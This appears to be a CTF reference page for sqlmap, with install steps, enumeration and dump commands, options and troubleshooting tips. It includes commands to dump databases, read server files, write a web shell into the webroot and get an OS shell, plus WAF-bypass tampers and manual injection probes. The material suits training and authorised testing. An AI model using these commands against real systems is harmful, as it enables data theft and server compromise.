---
title: "Tool - sqlmap"
category: web
subcategory: sql-injection
type: tool
tags: [sqlmap, sqli, sql-injection, blind-sqli, boolean-based, time-based, union, dump, tamper, dbms, mysql, postgresql, sqlite, mssql, oracle, os-shell, web]
summary: "Automated SQL injection detection and exploitation: find the injection, fingerprint the DBMS, dump the data, and sometimes get a shell."
related: [web-triage, burpsuite, ffuf, source-code-given]
---

## What it is

`sqlmap` automates the tedious parts of SQL injection: detecting which parameter is injectable and by which technique (boolean, error, time, UNION, stacked), fingerprinting the DBMS, and then extracting data or files. In CTF it is the right first move on any suspected SQLi, but the intended solution is often a filter bypass sqlmap will not find on its own - so know both the tool and the manual technique.

## Install

```sh
# Debian/Ubuntu/Kali
sudo apt install sqlmap
# pipx
pipx install sqlmap
# from git (most current tamper scripts)
git clone --depth 1 https://github.com/sqlmapproject/sqlmap
python3 sqlmap/sqlmap.py --version
# macOS
brew install sqlmap
```

## The invocations that matter

```sh
U='https://target.ctf/item.php?id=1'

# 1. basic test of a GET parameter
sqlmap -u "$U" --batch

# 2. the reliable pattern: save the request from Burp and feed the file
#    (handles cookies, headers, POST bodies and JSON correctly)
sqlmap -r request.txt --batch

# 3. tell it which parameter to test, and turn the aggression up
sqlmap -r request.txt -p id --level=5 --risk=3 --batch

# 4. enumerate progressively
sqlmap -r request.txt --dbs                       # databases
sqlmap -r request.txt -D ctf --tables             # tables
sqlmap -r request.txt -D ctf -T flags --columns   # columns
sqlmap -r request.txt -D ctf -T flags --dump      # the data
sqlmap -r request.txt --dump-all --exclude-sysdbs # everything non-system

# 5. run a SQL statement directly (fastest once the injection is confirmed)
sqlmap -r request.txt --sql-query="SELECT flag FROM flags LIMIT 1"
sqlmap -r request.txt --sql-shell                 # interactive

# 6. read a file from the server (MySQL FILE privilege / PostgreSQL)
sqlmap -r request.txt --file-read=/flag.txt
sqlmap -r request.txt --file-write=shell.php --file-dest=/var/www/html/shell.php

# 7. command execution where the DBMS allows it
sqlmap -r request.txt --os-shell        # MySQL w/ writable webroot, MSSQL xp_cmdshell, PG COPY FROM PROGRAM
sqlmap -r request.txt --os-cmd='id'

# 8. force a technique and DBMS when detection is slow or wrong
sqlmap -r request.txt --technique=BT --dbms=mysql --batch
#   B=boolean E=error U=union S=stacked T=time Q=inline

# 9. bypass a filter/WAF with tamper scripts
sqlmap -r request.txt --tamper=space2comment,between,randomcase --batch
sqlmap --list-tampers

# 10. POST/JSON/header injection points, marked with *
sqlmap -u "$U" --data='{"id":"1*"}' --headers='Content-Type: application/json'
sqlmap -u 'https://t/api' --headers='X-User: 1*' --batch
sqlmap -u "$U" --cookie='session=abc; id=1*' --level=2
```

Options that matter in practice:

| Option | Effect |
|---|---|
| `--batch` | accept all defaults; use it always in a CTF |
| `--level=1..5` | how many injection points to test (5 adds headers, cookies) |
| `--risk=1..3` | how dangerous the payloads may be (3 includes `OR`-based, which can modify data) |
| `--threads=10` | parallelism; speeds up blind extraction a lot |
| `--flush-session` | forget prior results for this target (essential after changing the app) |
| `--proxy=http://127.0.0.1:8080` | route through Burp to see exactly what it sends |
| `--random-agent` | rotate the User-Agent |
| `--delay=1` / `--time-sec=5` | tune for slow or rate-limited targets |
| `--prefix=` / `--suffix=` | inject inside a known context, e.g. `--prefix="') "` |
| `--dbms=` | skip fingerprinting when you already know |
| `--current-db` / `--current-user` / `--is-dba` | quick context |
| `--technique=` | restrict to techniques that work |
| `--no-cast` / `--hex` | fix garbled output on some DBMS |
| `-v 3` | show the payloads it is sending (learn from them) |

## Gotchas

- **`-r request.txt` from Burp is the highest-success invocation.** Copy the raw request (right-click -> Copy to file) rather than reconstructing the URL by hand.
- Mark the injection point explicitly with `*` when sqlmap will not find it: `--data='id=1*'`.
- sqlmap caches results in `~/.local/share/sqlmap/output/`. After you change the challenge or the payload context, `--flush-session` or it will replay stale findings.
- In CTF, sqlmap frequently finds **nothing** because the app has a custom filter. Test manually first (`'`, `''`, `1' AND '1'='1`, `1 AND SLEEP(5)`) to confirm an injection exists, then help sqlmap with `--prefix`/`--suffix`/`--tamper`.
- Time-based blind is extremely slow. Raise `--threads` and prefer boolean/UNION if the app gives you any differential.
- `--risk=3` can issue `UPDATE`/`DELETE`-shaped payloads. On a shared CTF instance that is antisocial; keep risk at 1-2 unless you own the target.
- `--os-shell` needs specific conditions (writable webroot and a known URL path for MySQL; `xp_cmdshell` enabled for MSSQL; superuser for PostgreSQL). It will ask you for the web root path.
- sqlmap will hammer the target. If the challenge container falls over, that is on you - use `--delay` and lower `--threads`.
- SQLite targets support far less: no `--os-shell`, no `LOAD_FILE`. Use `ATTACH DATABASE` to write a file instead.
- NoSQL injection is a completely different thing; sqlmap does not do it. `ctfbrain search nosqli`.

## If it fails, use instead

| Situation | Alternative |
|---|---|
| Custom filter sqlmap cannot bypass | manual injection; `ctfbrain search sqli` |
| Blind extraction with a custom oracle | a hand-written binary-search script in Python + `requests` |
| GraphQL/JSON APIs with odd encoding | write the requests yourself; sqlmap's JSON support is limited |
| NoSQL (MongoDB) | `nosqlmap`, or hand-crafted `$regex` extraction |
| You want to understand the injection | do it by hand once; sqlmap teaches you nothing |
| Second-order injection | manual - sqlmap cannot correlate the injection with a later page |
| Rate-limited target | a custom script with backoff, or a different primitive entirely |
